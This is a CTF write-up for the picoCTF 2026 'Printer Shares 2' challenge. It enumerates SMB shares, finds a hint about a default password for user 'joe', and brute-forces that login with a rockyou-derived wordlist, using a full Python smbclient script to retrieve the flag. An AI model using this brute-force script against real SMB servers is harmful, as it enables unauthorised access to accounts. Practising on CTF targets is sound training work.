# Printer Shares 2 — picoCTF 2026

Hints given:

- Hint 1: default password is dangerous, isn't it?
- Hint 2: can you find a potential user? What is the username?
- Hint 3: the wordlist, rockyou.txt, is pretty common for password cracking

Check that the port is open:

    nc -vz green-hill.picoctf.net 55679

List SMB shares:

    smbclient -L //green-hill.picoctf.net -p 55679 -N
        shares          Disk      Public Share With Guests
        secure-shares   Disk      Printer for internal usage only

First, inspect the public `shares` share:

    smbclient //green-hill.picoctf.net/shares -p 55679 -N
    smb: \> ls
      content.txt                         N     1107  Wed Feb  4 21:22:17 2026
      kafka.txt                           N     1080  Wed Feb  4 21:22:17 2026
      notification.txt                    N      260  Wed Feb  4 21:22:17 2026

Download the files:

    smb: \> get content.txt
    smb: \> get kafka.txt
    smb: \> get notification.txt
    smb: \> quit

Read the notification:

    cat notification.txt
    Hi Joe,
    We’ve identified a vulnerability in this printer. Until the issue is resolved, please use an alternative printer.
    If you have never logged into the printer before, please note that the default password is currently in use.
    Best,
    The Operator Team

Try accessing the secure share anonymously:

    smbclient //green-hill.picoctf.net/secure-shares -p 55679 -N
    tree connect failed: NT_STATUS_ACCESS_DENIED

Try authenticating as `joe`:

    smbclient //green-hill.picoctf.net/IPC$ -p 55679 -U joe
    Password for [WORKGROUP\joe]:
    session setup failed: NT_STATUS_LOGON_FAILURE

Create a small wordlist with possible default passwords and brute‑force with a Python script, with no success:

    $ python3 bruteforcepassword.py

After the hint, download rockyou.txt:

    $ curl -L https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz -o rockyou.tar.gz
    $ tar -xzf rockyou.tar.gz

Make a much smaller list (only lowercase words, first 1000):

    $ wc -l rockyou.txt
    7081926 rockyou.txt
    
    $ grep -E '^[a-z]+$' rockyou.txt > rockme.txt
    $ head -1000 rockme.txt > rockme1000.txt
    $ wc -l rockme1000.txt
    1000 rockme1000.txt

Run the brute‑force script again and get the password.

Then:

    $ smbclient //green-hill.picoctf.net/secure-shares -p 56439 -U joe
    Password for [WORKGROUP\joe]:
    smb: \> ls
    smb: \> get flag.txt
    smb: \> exit
    
    $ cat flag.txt

Here is my python script:
```python
import subprocess

host = "green-hill.picoctf.net"
port = "56439"
user = "joe"
#wordlist = "goldenwordlist.txt"
wordlist = "rockme1000.txt"

with open(wordlist, "r", errors="ignore") as f:
    for password in f:
        password = password.strip()
        print(f"Testing: {password}")

        cmd = [
            "smbclient",
            f"//{host}/secure-shares",
            "-p", port,
            "-U", user,
            "-c", "ls"
        ]

        try:
            result = subprocess.run(
                cmd,
                input=password + "\n",
                text=True,
                capture_output=True,
                timeout=3
            )

            if "NT_STATUS_LOGON_FAILURE" not in result.stdout:
                print(f"\nSUCCESS! Password is: {password}")
                break

        except subprocess.TimeoutExpired:
            pass
```
